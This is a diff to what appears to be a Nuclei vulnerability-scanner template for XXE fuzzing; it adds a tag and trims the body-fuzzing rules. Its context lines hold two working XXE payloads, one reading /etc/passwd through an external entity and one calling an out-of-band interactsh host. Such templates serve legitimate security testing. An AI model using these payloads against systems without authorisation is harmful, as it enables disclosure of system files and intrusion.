@@ -6,7 +6,7 @@ info:
   severity: medium
   reference:
     - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
-  tags: fuzzing-req-xxe,fuzzing-req-body
+  tags: fuzzing-req-xxe,fuzzing-req-body,xxe
 
 variables:
   rletter: "{{rand_base(6,'abc')}}"
@@ -26,19 +26,7 @@ http:
         - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>'
         - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{rletter}};</x>'
         
-    fuzzing:
-      - part: body
-        keys-regex:
-          - "(.*?)xml(.*?)"
-        fuzz:
-          - "{{xxe}}"
-          
-      - part: body
-        values:
-          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
-        fuzz:
-          - "{{xxe}}"
-          
+    fuzzing:        
       - part: body
         type: replace
         mode: single
